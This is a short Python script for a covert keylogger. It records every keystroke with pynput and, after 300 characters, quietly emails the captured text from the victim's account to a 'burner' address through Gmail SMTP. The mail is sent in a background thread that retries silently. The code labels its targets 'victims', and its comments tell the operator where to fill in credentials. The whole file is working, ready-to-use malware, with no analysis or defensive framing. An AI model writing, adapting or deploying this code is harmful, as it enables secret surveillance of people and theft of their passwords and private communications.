from pynput.keyboard import Listener
import smtplib
import time
import socket
import threading
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


keystrokes = ""

def log_happykey(key):
    global keystrokes
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = '  '
    elif key == 'Key.enter':
        key = '\n'
    elif key == 'Key.shift':
        key = ''
    elif key == 'Key.backspace':
        key = '<backspace>'

    keystrokes += key

    # Check if the accumulated keystrokes reach 500, then send an email. Change this number as you like
    if len(keystrokes) >= 300:
        send_email_with_content(keystrokes)
        keystrokes = ""  #Reset keystrokes after sending the email

def send_email_with_content(content):
   def background_task():
        from_email = "victim email"
        to_email = "your burner email"
        password = "ur email pw"

        msg = MIMEMultipart()
        msg['From'] = from_email
        msg['To'] = to_email
        msg['Subject'] = "Victims keyloggs"
        msg.attach(MIMEText(content, 'plain'))

        while True:
            try:
                # Check internet availability (quietly)
                socket.create_connection(("8.8.8.8", 53), timeout=3)
                
                # Try sending email
                server = smtplib.SMTP('smtp.gmail.com', 587, timeout=10)
                server.starttls()
                server.login(from_email, password)
                server.sendmail(from_email, to_email, msg.as_string())
                server.quit()
                break  # Exit once successfully sent

            except:
                # Wait 10 seconds and retry quietly
                time.sleep(20)
                continue

    # Run quietly in background so it doesn’t block main code
   threading.Thread(target=background_task, daemon=True).start()

#Start keystroke logging
with Listener(on_press=log_happykey) as l:
    l.join()